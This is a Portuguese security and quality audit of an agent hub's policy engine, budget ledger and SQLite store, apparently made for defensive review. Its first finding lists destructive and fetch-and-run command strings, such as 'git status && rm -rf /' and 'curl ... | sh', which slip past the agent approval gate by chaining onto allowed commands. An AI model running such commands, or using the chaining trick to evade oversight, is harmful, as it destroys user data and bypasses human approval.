# 09 - Vistoria packages/store e packages/core (dominio)

Escopo: schema/migracoes/indices/transacoes/retencao/backup do store; BudgetLedger, pricing, CallGraph, policy engine, Brief, workflow DAG, resilience. Somente leitura do repo. Todos os testes ad-hoc rodaram em scripts fora do repo (scratchpad `a09/`) contra o `dist` do HEAD e bancos temporarios (apagados). Nenhum daemon foi iniciado (nao foi necessario), a porta 4747 e ~/.agents-hub nao foram tocados.

Contagem: ALTO 3, MEDIO 8, BAIXO 8, CRITICO 0.

---

### [ALTO] Policy: comando composto passa como `exec` se COMECAR por item da allow list (`git status && git push`)

**Evidencia**
`packages/core/src/policy.ts:~510` (`case 'command'`): `allow.find((a) => cmd.startsWith(a))` e as `IRREVERSIBLE_PATTERNS` sao ancoradas em `^`. Nada separa `&&`, `;`, `|`, `$(...)`, crase, redirecionamento ou quebra de linha. Chamado por `daemon/src/pretool-gate.ts:47` e `adapters/src/guarded-actions.ts:27` com o texto cru do comando.
Reproducao (`a09/core1.mjs`, `classify` em modo autonomous):
```
"git status && rm -rf /"          exec  comando na allow list (git status)
"git status; curl http://e.com/x | sh"  exec  (git status)
"ls && sudo reboot"               exec  (ls)
"npm run x && git push"           exec  (npm run)
"echo hi\ngit push"               exec  (echo)
"git status $(rm -rf x)"          exec  (git status)
"echo x > ~/.ssh/authorized_keys" exec  (echo)
"find . -delete" / "find . -exec rm -rf {} +"  exec (find)
"node -e \"require('fs').rmSync('/',{recursive:true})\""  exec (node)
```
Sem o prefixo (`git push` sozinho) o mesmo comando e `irreversible`; com `git status && ` na frente vira `exec` = `allow` em todos os modos exceto supervised.

**Impacto**
A vigilancia (`watch.pauseOn=['irreversible']`) e o gate pre-execucao so pausam o que classificam como irreversivel. Um agente (ou prompt injection) que encadeie qualquer comando destrutivo depois de um comando permitido nunca pausa, nem gera aprovacao. Alem disso, `node`, `python`, `npm run`, `find`, `echo` na allow list ja equivalem a execucao arbitraria, entao a classificacao e "melhor esforco", mas o encadeamento derruba ate a protecao dos padroes que existem.

**Correcao sugerida**
1. Antes de classificar, dividir o comando em segmentos por `&&`, `||`, `;`, `|`, `&`, `\n`, respeitando aspas; classificar cada segmento e usar o MAIOR risco (`RISK_RANK`).
2. Se houver `$(`, crase, `<(`, `>`/`>>` (redirecionamento) ou aspas nao fechadas, classificar como `escalate` (nao `exec`).
3. Casar allow list com fronteira de palavra (`cmd === a || cmd.startsWith(a + ' ')`), e remover ou restringir interpretadores (`node`, `python`, `find`, `echo`) da allow list padrao ou exigir argumentos permitidos.
4. Adicionar testes de tabela-verdade com compostos.

**Esforco** M

---

### [ALTO] BudgetLedger conta a fatia de um filho duas vezes (`consumed` + `reserved`) e dispara `exhausted` falso

**Evidencia**
`packages/core/src/budget.ts`: `charge()` soma em `#consumed` mas nao reduz a reserva da task; `settle()` (que devolve a reserva) so roda no fim (`session-manager.ts:1666`, com `{ seconds }` apenas). `snapshot()` calcula `remaining = limit - consumed - reserved`.
Reproducao (`a09/b.mjs`):
```
L = new BudgetLedger('r', {usd:10, tokens:1e6, seconds:3600});
L.reserve('child', {usd:6});  L.charge({usd:5});
=> remaining.usd = -1, exhausted = true, pressure = 1.10   (gasto real: 5 de 10)
settle('child', {seconds:30}) => consumed.usd 5, exhausted false
```
Caminho real: `session-manager.ts:360` reserva `brief.budget.usd` do filho na ledger da raiz; o `#pump` do filho cobra na mesma ledger (`:1606`) e, ao ver `snapshot.exhausted`, emite `budget.exceeded` e abre aprovacao.

**Impacto**
Toda delegacao com `budget.usd` explicito e cobrada em dobro enquanto roda: a raiz e os irmaos podem ser pausados por "orcamento estourado" quando so 55% foi gasto (exemplo acima), exigindo aprovacao humana indevida; `budget.warning` dispara cedo; `pressure` mostrado na UI fica inflado.

**Correcao sugerida**
Fazer `charge(actual, taskId?)` abater da reserva da task o mesmo valor (`reserved -= min(reserved_task, actual)`, mantendo o saldo por dimensao na Map), de modo que `consumed + reserved` seja invariante ate o gasto passar da fatia; ou calcular `remaining` como `limit - consumed - max(0, reserved - gasto_da_task)`. Cobrir com teste "reserva 6, gasta 5 => remaining 5".

**Esforco** M

---

### [ALTO] Contexto de replay/`hub_context_fetch` usa os PRIMEIROS N eventos da sessao, nao os ultimos

**Evidencia**
`packages/store/src/repositories.ts` (`SqliteEventRepository.list`): `ORDER BY session_id, seq LIMIT ?` (ascendente, sem modo "cauda"). Chamadores em `daemon/src/session-manager.ts:1104` e `:1230`: `events.list({ sessionId, limit: 400 })` para `rebuildConversation`; `:1381`: `limit: 200` para `hub_context_fetch session:<id>`.
`packages/core/src/conversation.ts` (`condensarHistorico`) promete "Condensa o historico mantendo o FIM".
Reproducao (`a09/store2.mjs`, 1000 eventos): `list({sessionId, limit:400})` retorna seq 1..400.

**Impacto**
Para agentes sem sessao nativa (Copilot, Kimi, primeiro turno) e para o fallback/handoff, em qualquer sessao com mais de 400 eventos o agente recebe o comeco da sessao (exploracao) e perde exatamente o fim, o que a funcao dizia preservar. O mesmo vale para `session:<id>` sem `#event`: mostra so os 200 primeiros. Silencioso (nenhum erro, contexto simplesmente velho).

**Correcao sugerida**
Adicionar ao `EventRepository.list` uma opcao `tail: true` (ou `order: 'desc'` + reverter no mapeamento) e usar `tail` nesses 3 chamadores; alternativa: `sinceSeq = lastSeq - N` como ja faz `#summarize` (`session-manager.ts:2517`). Filtrar por tipos narrativos no SQL para nao gastar o limite com eventos irrelevantes.

**Esforco** P

---

### [MEDIO] Padroes de "irreversivel" e allow list com lacunas e falsos positivos

**Evidencia** (`a09/core1.mjs`, `classify`, modo autonomous)
```
"rm --recursive --force dir"       escalate   (nao casa /^rm\s+-[a-z]*r.../ porque "--")
"git -C . push"                    escalate   (regex ancorada em ^git\s+push)
"git -c a=b push origin main"      escalate
"git branch --delete --force x"    exec       (allow list "git branch")
"git stash drop" / "git stash clear"  exec    (allow list "git stash")
"git clean -n -f"                  escalate
"git branch -d x"                  irreversible (falso positivo: /i faz -D casar -d)
"catalog" -> exec (cat) ; "lsblk" -> exec (ls) ; "nodemon x" -> exec (node)   (sem fronteira de palavra)
"SUDO ls" / "reg  delete HKLM\x" -> escalate (deny list e case-sensitive e de espaco unico)
```
`escalate` so entra em `flagOn` por padrao (`DEFAULT_POLICY.watch`), nao pausa: entao `rm --recursive --force` e `git -C . push` executam sem pausar.

**Impacto**
Formas equivalentes de comandos destrutivos escapam da pausa; `git stash drop`, `git branch --delete --force`, `find -delete` sao perda de dados sem aviso; falso positivo em `git branch -d` gera aprovacoes desnecessarias.

**Correcao sugerida**
Normalizar antes de casar (remover opcoes globais `-C <dir>`, `-c k=v`; expandir opcoes longas), acrescentar `--recursive|--force`, `git stash (drop|clear)`, `git branch --delete`, `find .* -(delete|exec)`, `del|rd|rmdir /s`; distinguir `-D` de `-d` (regex sem `/i` nesse caso ou `(?-i:D)`); fronteira de palavra na allow/deny; deny list case-insensitive com `\s+`.

**Esforco** M

---

### [MEDIO] "Deny list" nao nega: vira `irreversible` e a decisao padrao e `approve`

**Evidencia**
`policy.ts` (`classify`, `denied`): retorna `{ risk: 'irreversible', reason: 'comando na deny list' }`; `decide` usa `policy.risk.irreversible` (`DEFAULT_POLICY` = `approve`). Saida real (`a09/core2.mjs`):
```
sudo supervised/semi/autonomous -> {"risk":"irreversible","decision":"approve","reason":"comando na deny list (sudo)"}
```
O tipo documenta (`PolicyDocument.commands.deny`): "Prefixos sempre negados, mesmo em modo autonomo".

**Impacto**
`sudo`, `shutdown`, `mkfs`, `diskpart`, `format `, `reg delete` podem ser executados com um clique de aprovacao. A garantia documentada ("sempre negados") nao existe.

**Correcao sugerida**
Fazer `classify` devolver um sinal `denied: true` e `decide` retornar `deny` incondicionalmente (nao passar por `policy.risk`), ou ajustar o texto do tipo/docs para "exigem aprovacao". Teste: deny + autonomous => `deny`.

**Esforco** P

---

### [MEDIO] Nao ha backup/restauracao do banco; copiar so o `.db` perde dados recentes (WAL)

**Evidencia**
`grep -rniE "backup|restaur|VACUUM|checkpoint" README.md docs SECURITY.md packages/*/src` so acha backup de configs de OUTROS CLIs (`.bak`), nenhum comando/rotina para o `hub.db`. `openDatabase` liga `journal_mode=WAL` (`store/src/db.ts:24`).
Reproducao (`a09/bk.mjs`, conexao aberta, 50 projetos inseridos): `db size 4096, wal size 815792`; copia so do `.db`: `projects in copy-only-db backup: 0 of 50`; `VACUUM INTO 'x'`: 50 de 50.

**Impacto**
O usuario que "faz backup" copiando `~/.agents-hub/hub.db` com o daemon rodando obtem um banco (quase) vazio; e os eventos/aprovacoes/orcamentos sao a fonte de auditoria do Hub. Sem rotina, corrupcao de disco/queda perde tudo.

**Correcao sugerida**
Adicionar `hub db backup [--out]` (via daemon: `VACUUM INTO '<arquivo>'` ou `sqlite3 backup`), `hub db restore` (com daemon parado e `integrity_check`), rotina periodica opcional (`retention.backupDays`) e documentar em README/docs que copiar o arquivo exige copiar `-wal`/`-shm` juntos.

**Esforco** M

---

### [MEDIO] Compactacao de `raw_json` sem lotes e passada "vazia" O(N) bloqueando o event loop; espaco nunca devolvido

**Evidencia** (`a09/perf.mjs`, 100k eventos com raw 1 KB, 10 sessoes encerradas)
```
compact 100000 2547-2741ms      (um UPDATE unico, sincrono; DatabaseSync bloqueia o daemon)
NOOP compact pass 0  775ms      (segunda passada, nada a fazer)
size before/after compactacao: 153.1 MB -> 153.1 MB ; apos VACUUM manual: 48.9 MB
EXPLAIN: SEARCH events USING INDEX idx_events_session (session_id=?) + SEARCH sessions USING INDEX idx_sessions_ended
```
`event-retention.ts` roda a cada `sweepIntervalMinutes` (60) e na largada; `repositories.ts` `compactRawBefore` sem `LIMIT`, sem indice em `raw_json`, `auto_vacuum=0` (`PRAGMA auto_vacuum` = 0).

**Impacto**
Extrapolando linearmente: 10M eventos => cerca de 77 s de daemon congelado (API/SSE/hooks parados) A CADA HORA so para constatar que nao ha nada a compactar, e a primeira passada apos dias de daemon parado e um UPDATE gigante (WAL de mesmo tamanho do banco: 154 MB de WAL medidos). Outros processos com `busy_timeout=5000` recebem `SQLITE_BUSY`. O arquivo nunca encolhe.

**Correcao sugerida**
Indice parcial `CREATE INDEX idx_events_raw ON events(session_id) WHERE raw_json IS NOT NULL` (nova migracao 5) ou coluna `raw_compacted_at` na sessao; atualizar em lotes (`WHERE id IN (SELECT id ... LIMIT 5000)`) cedendo o event loop entre lotes; `PRAGMA auto_vacuum=INCREMENTAL` na criacao + `PRAGMA incremental_vacuum(N)` apos compactacao (o roadmap ja registra que ficou de fora); `wal_checkpoint(TRUNCATE)` apos passada grande.

**Esforco** M

---

### [MEDIO] Consultas agregadas por sessao/arvore escalam mal com muitos eventos (bloqueiam o processo)

**Evidencia** (100k eventos, 10 sessoes)
```
graphRows(root)              1202 ms   (LEFT JOIN events + json_extract em todos os eventos da raiz)
costOf(session, 10k eventos)  102 ms
list({types:['cost'],limit:5000}) 569 ms (idx_events_type + TEMP B-TREE FOR ORDER BY session_id, seq)
list({taskId}) usa idx_events_task + TEMP B-TREE (37 ms)
```
`graphRows` alimenta o grafo (`session-manager.ts:1404`), `costOf` e chamado no pipeline de validacao (`:1769`). `DatabaseSync` executa no thread principal.

**Impacto**
Com 1M de eventos, o grafo de uma raiz grande leva ordem de 10 s durante os quais daemon, SSE e hooks ficam parados.

**Correcao sugerida**
Coluna gerada/indexada `cost_usd`/`cost_tokens` em `events` (ou tabela de agregados `session_costs` atualizada em `append`); indice `events(task_id, session_id, seq)` e `events(type, session_id, seq)` para eliminar o sort; cachear `graphRows` por `updated_at` da raiz.

**Esforco** M

---

### [MEDIO] `mergePolicyLayer(clampToBase)` nao trava varios campos (contradiz SECURITY.md:35 e docs/04:122)

**Evidencia** (`a09/core2.mjs`, base = DEFAULT_POLICY, camada de projeto hostil):
```
{"budget":{"usd":5000,...},"retries":{"max":50,...},"task":999999,"sess":999999,"hb":999999,
 "fb":["evil"], ...}   // apertados corretamente: risk, maxDepth, allowWriteOutsideWorkdir, commands.allow, network, watch
```
`policy.ts` `mergePolicyLayer`: `defaultBudget`, `retries`, `taskTimeoutSeconds`, `sessionTimeoutSeconds`, `heartbeatTimeoutSeconds` e `fallback` fazem merge livre mesmo sob `clampToBase`. Tambem `PolicyEngine.intersect` mantem `defaultBudget`/`retries`/`fallback` do FILHO (`...child`).
Mitigante encontrado: hoje o daemon le esses campos de `this.config.policy` (global) e nao da politica mesclada do projeto (`session-manager.ts:354,1499,1798,2012`), entao a brecha e latente, nao explorada; em compensacao, `retries`/`defaultBudget`/`fallback` que o projeto declara (`ProjectPolicyOverrides`) sao silenciosamente ignorados.

**Impacto**
Qualquer futuro uso da politica efetiva de projeto para budget/retry/timeouts deixaria um repo clonado hostil elevar o teto de gasto e de tentativas. Hoje: configuracao de projeto que parece valer e nao vale.

**Correcao sugerida**
Sob clamp: `min` para timeouts/`retries.max`/`defaultBudget.*`, `retries.backoffMs` `max`, `fallback` so removendo/reordenando agentes ja presentes; em `intersect`, `min` para budget/retries. Decidir e documentar se esses campos podem ser de projeto e passar a consumi-los (ou remover de `ProjectPolicyOverrides`).

**Esforco** P

---

### [MEDIO] Politica de arquivos: leitura nunca protegida; lista de escrita sensivel incompleta

**Evidencia** (`a09/core1.mjs`)
```
read C:\proj\.env            -> allow (supervised)   ; read ~\.ssh\id_rsa -> allow
write .git\hooks\pre-commit  -> write (allow)        ; write .github\workflows\x.yml -> write
write .npmrc / .mcp.json / .claude\settings.json -> write
write src\.environment\a (falso positivo) irreversible ; docs\credentials.md irreversible
```
`classify` `file.read` sempre `read`; `denyFragments` so vale para escrita e e substring simples. `git commit` e `npm test` estao na allow list, entao escrever `.git/hooks/pre-commit` e depois `git commit` executa codigo arbitrario sem aprovacao.

**Impacto**
Exfiltracao de segredos por leitura + ausencia de barreira para arquivos que viram execucao (hooks git, CI, settings de agentes, package scripts).

**Correcao sugerida**
Aplicar `denyFragments` tambem a `file.read` (decisao `approve`), acrescentar `.git/hooks`, `.github/workflows`, `.npmrc`, `.mcp.json`, `.claude/settings`, `.ssh`, `.gnupg` aos padroes, casar por segmento de caminho (nao substring) para reduzir falsos positivos (`.environment`, `credentials.md`).

**Esforco** P

---

### [MEDIO] BudgetLedger aceita entradas invalidas (NaN, negativos) e vaza reserva em `reserve` duplicado

**Evidencia** (`a09/core2.mjs`)
```
charge({usd:-5})   -> consumed.usd = -5          (abate gasto de verdade)
charge({usd:NaN})  -> consumed.usd = NaN, exhausted=false, pressure=NaN  (teto desligado ate reiniciar)
reserve('t1',{usd:4}) x2 -> reserved 8; release('t1') uma vez -> reserved 4 preso (Map guarda 1 entrada)
```
Chamadores passam `mapped.cost.usd ?? 0` e tokens direto do adapter (`session-manager.ts:1606,2467`) sem `Number.isFinite`. `reserve` repetido para o mesmo `taskId`: o fallback/retry move a task de sessao mantendo o mesmo id.

**Impacto**
Um adapter que emita custo malformado (NaN/negativo) desliga ou reduz o teto de gasto silenciosamente; reserva duplicada trava saldo da raiz ate reinicio do daemon (a ledger recarrega `reserved = ZERO_USAGE`).

**Correcao sugerida**
Em `addUsage`/`charge`/`settle`: ignorar valores nao finitos e clampar a >= 0; em `reserve`, se `taskId` ja existe, liberar a anterior antes de somar (ou lancar `ILLEGAL_STATE`).

**Esforco** P

---

### [BAIXO] Schemas de politica aceitam valores sem sentido; risk parcial cai em fail-open

**Evidencia** (`a09/core2.mjs`): `PartialPolicyDocumentSchema` aceita `maxDepth:-1`, `maxConcurrency:0.5`, `taskTimeoutSeconds:0`, `defaultBudget.usd:-5`, chave com erro de digitacao (`maxDepht`) e a descarta (a config GLOBAL usa schema nao estrito; so o projeto usa `.strict()`, `project-config.ts:87`). `PolicyDocumentSchema.risk` (`z.record(enum, enum)`, zod 3.25) aceita `{risk:{read:'allow'}}`; com chave ausente, `narrowestDecision(undefined, byMode)` devolve o overlay do modo (em autonomous, `escalate` ausente vira `allow`).
**Impacto** Typos em `~/.agents-hub/config.json` ficam silenciosos; valores absurdos derrubam a concorrencia ou o orcamento; politica completa mal formada abre fail-open (hoje protegido porque a config sempre mescla sobre `DEFAULT_POLICY`).
**Correcao sugerida** `.int().positive()/.nonnegative()` nos campos numericos, `.strict()` tambem na config global, `PolicyDocumentSchema.risk` exaustivo (`z.object` com as 6 chaves) e default `approve` em `decide` quando a chave faltar.
**Esforco** P

### [BAIXO] Brief: validacoes frouxas

**Evidencia** (`a09/core2.mjs`): objetivo com 8 espacos passa (`min(8)` sem `.trim()`); objetivo de 1 MB aceito (workflow limita 50k, o Brief nao); `agent:'   '` aceito; `budget.usd: Infinity` aceito (`positive()` sem `.finite()`); `artifacts:[{path:'../../../etc/passwd',mode:'write'}]` aceito; arrays de 10k criterios aceitos; `upstream.summary` (saida de outro agente) e renderizada crua em `renderBriefAsPrompt`, permitindo cabecalhos `# Tarefa` injetados.
**Impacto** Custo/contexto inflado, briefs vazios validos, caminho de artefato fora do workdir chega ao agente.
**Correcao sugerida** `.trim().min(8)`, `.max(50_000)`, `.finite()`, limites de array, refinamento de `artifacts.path` (relativo, sem `..`), e cercar `summary` em bloco de citacao/code fence no render.
**Esforco** P

### [BAIXO] Pricing: variantes desconhecidas casam por prefixo com confianca `model`; itens nao modelados

**Evidencia** (`a09/core3.mjs`): `gemini-3-flash -> gemini-3-1-pro` (alias generico `gemini-3`), `gpt-5-3-codex-spark` e `gpt-5.3-codex-max -> gpt-5-3-codex`, `claude-opus-5-fast -> claude-opus-5` (nota da tabela admite fast 10/50, 2x, nao modelado), `claude-opus-4`/`claude-sonnet-4-20250514`/`claude-3-5-sonnet` -> nada. Todos os acertos por prefixo saem `basis:'estimated', confidence:'model'`. `cacheWritePerMTok` nao e usado (subestima). `subset` com `cachedTokens > inputTokens` cobra o cache cheio (0.175 USD para 100 tokens de entrada). `OPENAI_CODEX_SRC` (pricepertoken.com) e `MOONSHOT_SRC` (benchlm.ai) sao agregadores de terceiros, nao paginas do provedor, contra o que docs/10 pede ("conferir a URL de proprio punho").
Verificado OK: as 47 linhas tem cache-read = 0,1x e cache-write = 1,25x da entrada nas Anthropic, `output >= input`, sem alias duplicado, todos os aliases ja normalizados, todo `AGENT_FALLBACK_MODEL` resolve. Precos em si nao foram verificados contra as fontes (sem acesso/dados; coleta 2026-08-27, 29 dias, dentro do gatilho trimestral do docs/10).
**Impacto** Estimativas erradas rotuladas como "modelo exato". Quem usa variante nova subestima ou superestima sem sinal.
**Correcao sugerida** Marcar `confidence:'agent-default'` (ou nova `'family'`) quando o casamento nao for igual ao alias completo; remover aliases genericos `gemini-3`/`composer`; usar fontes primarias.
**Esforco** P

### [BAIXO] `combineCostEstimates`: rotulo de confianca incoerente

**Evidencia** (`a09/core3.mjs`): `[reported, unknown] -> basis estimated, confidence 'agent-default'` e `[estimated/model, unknown] -> 'agent-default'`, embora nenhum agente-default esteja envolvido; `[]` -> `reported/exact`.
**Impacto** UI mostra a origem errada do numero. **Correcao sugerida** Nova confianca `'partial'` para "ha parcela desconhecida". **Esforco** P

### [BAIXO] `transaction()` nao protege contra fn assincrona nem usa SAVEPOINT

**Evidencia** (`a09/store2.mjs`): `uow.transaction(() => Promise.resolve(1))` retorna `Promise` e da COMMIT antes de a promessa resolver; transacao interna que falha e cuja excecao e engolida deixa as escritas parciais internas no commit externo (`T5b`).
**Impacto** Hoje os 4 usos no daemon sao sincronos; risco futuro. **Correcao sugerida** Rejeitar retorno thenable (`throw`), e usar `SAVEPOINT` no aninhamento. **Esforco** P

### [BAIXO] Integridade e desempenho: lacunas de schema

**Evidencia** (`a09/store2.mjs`, `migrations.ts`): `events.task_id` sem FK (aceita `tsk_ghost`); duas pastas `is_primary=1` no mesmo projeto aceitas (a guarda esta so no daemon, `project-registry.ts:133`); `projects.path`/`project_folders.path` UNIQUE e sensivel a caixa/barras (`C:/x`, `c:/X`, `C:\x` coexistem no store; `validarNovaPasta` cobre caixa mas `C:\Users\b\proj.` (ponto final, equivalente no Win32) e nomes 8.3 `BRUNOS~1` passam); sem indice em `events(ts)`; `approvals`/`artifacts`/`budgets` sem retencao; `events.list({limit:-1})` no store ignora o teto (SQLite `LIMIT -1` = sem limite; a rota HTTP ja barra negativos em `http-schemas.ts:157`).
**Impacto** Dados orfaos e duplicidade so evitados por convencao do chamador. **Correcao sugerida** Indice unico parcial `ON project_folders(project_id) WHERE is_primary=1`, normalizar `path` (caixa + `\`->`/` + trim de ponto/espaco) antes de gravar, `limit = clamp(1..5000)`. **Esforco** P

### [BAIXO] Workflow: teto de orcamento pessimista e sem limite de passos

**Evidencia** (`a09/core4.mjs`): passo com `budget.usd:100` e teto global 10 recebe cap 10 e o irmao do mesmo lote fica `skipped` ("orcamento esgotado"), assim como o dependente, sem ter gasto nada; sem maximo de `steps` (cadeia de 5000 passos valida). Se um passo gasta mais que o cap (6 num cap 4), `totalUsd` passa do teto (12 de 10): o runner so repassa `capUsd` e nao verifica.
Verificado OK: ciclos, auto-referencia, duplicados, dependencia inexistente, ids `__proto__`, dependencia repetida, timeout propagando `skipped`, retentativa de concorrencia (6/6), ordem invalida.
**Correcao sugerida** Dividir o saldo entre irmaos por peso quando a soma dos pedidos exceder o saldo; `steps.max(200)`; avisar quando `usd > cap`. **Esforco** P

### [BAIXO] Resiliencia e CallGraph: pequenos desvios de semantica

**Evidencia** (leitura + `a09/core2.mjs`): `classifyOutcome` trata `timeout`/`heartbeat` como transiente, entao uma task que estoura `taskTimeoutSeconds` (30 min) e repetida ate `retries.max` (3 execucoes de 30 min no mesmo agente). `pathKey` usa o alvo literal (`cap:code-edit` != `claude`) e o hash so normaliza caixa/espacos (`"Fix the bug."` != `"Fix the bug"`), entao ciclos por sinonimo ou pontuacao escapam. `buildGraph` descarta ambos os nos de um ciclo de `parent_id` (ficam 0 raizes).
**Correcao sugerida** Limitar retry de `timeout` a 1; resolver `cap:` para o agente antes de `pathKey`; remover pontuacao no hash. **Esforco** P

---

## Verificado OK

- Migracoes: 4 migracoes em ordem, transacionais, reabertura idempotente, guarda de downgrade dispara (`HUB_CONFIG_INVALID`), 12 processos abrindo um banco novo ao mesmo tempo (3 rodadas) sem falha de migracao.
- Integridade: `PRAGMA integrity_check = ok` e `foreign_key_check = 0` apos 100k eventos, compactacao e `VACUUM`; FK de `events.session_id` e UNIQUE `(session_id, seq)` aplicados; rollback de transacao aninhada correto.
- Indices: consultas por `session_id+seq`, `task_id`, `type` usam indice (`EXPLAIN QUERY PLAN`); `list` por sessao 9-13 ms com 100k eventos; `lastSeq` 0 ms; insercao de 100k em transacao unica em 22 s.
- Compactacao: nunca apaga nem toca `payload_json`, so sessoes encerradas antes do corte; idempotente.
- Tabela-verdade de risco x modo (`a09/core1.mjs`): overlay so endurece (supervised: read allow, resto approve; semi: ate exec allow; autonomous: idem com base padrao; com base permissiva autonomous libera `escalate`, mantem `budget`/`irreversible` em approve). `narrowestDecision`, `inheritMode`, `intersect` (risco, allow, deny, rede, paths) corretos; clamp de `risk`, `allowWriteOutsideWorkdir`, `commands.allow`, `network`, `watch`, `maxDepth` funciona.
- Politica de caminho: `..` e irmao com prefixo (`C:\proj2`), outra unidade e caixa da unidade tratados; `.ENV`/`.env.local`/`.aws`/`.git/config` bloqueados; rede: sufixo de dominio correto (`github.com.evil.com` e `evilgithub.com` nao casam). Chamadores resolvem caminho relativo contra o workdir antes de `classify`.
- CallGraph: ciclo `(agente, objetivo)` normalizado, `DEPTH_EXCEEDED` em `maxDepth` 0 e no limite.
- Workflow DAG: Kahn em niveis correto (losango, linear, ciclo, duplicados); fan-in de resumo entregue; propagacao de `skipped`.
- BudgetLedger: `reserve` acima do saldo lanca `BUDGET_EXCEEDED`, `settle` idempotente quanto a reserva, `project()` sem divisao por zero.
- Resilience `nextStep`: 1 + `maxRetries` tentativas antes do fallback, backoff exponencial, cadeia sem repetir agente, `give_up` no fim.
- Pricing: aritmetica disjoint/subset correta (opus-5: 30,5 USD para 1M/1M/1M), `usd:0` com tokens cai para estimativa, `NaN`/negativo/string ignorados, modelos Bedrock/Vertex/`provider/` normalizados.
